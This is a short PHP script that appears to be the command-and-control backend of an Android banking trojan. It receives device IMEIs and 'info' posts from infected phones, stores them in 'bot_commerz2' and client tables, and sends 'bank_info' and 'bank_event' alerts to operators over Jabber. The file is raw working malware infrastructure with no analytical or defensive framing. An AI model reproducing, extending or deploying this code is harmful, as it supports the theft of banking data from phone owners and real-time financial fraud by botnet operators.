<?php
require_once '../db.php';
require_once 'func.php';
    
    $IMEI = $mysqli->real_escape_string($_POST['IMEI']);
    $info = $mysqli->real_escape_string($_POST['info']);
    
    $querry = "INSERT INTO `bot_commerz2` (`IMEI`, `info`) values ('$IMEI', '$info')";
    
    $query = "UPDATE `kliets` SET `IMEI` = '$IMEI', `info` = CONCAT(`info`, '$info\n') WHERE `IMEI` = '$IMEI'";

    $res = $mysqli->query($query);
    $ress = $mysqli->query($querry);

    # send dedicaded event to jabber clients
	 if (check_imei_event($IMEI, $mysqli)){
	 	send_jabber_event('dedicated_event', $IMEI.":bank_info ".$info, $mysqli);
	 }
	 send_jabber_event('bank_event', $IMEI.":bank_event ".$info, $mysqli);

?>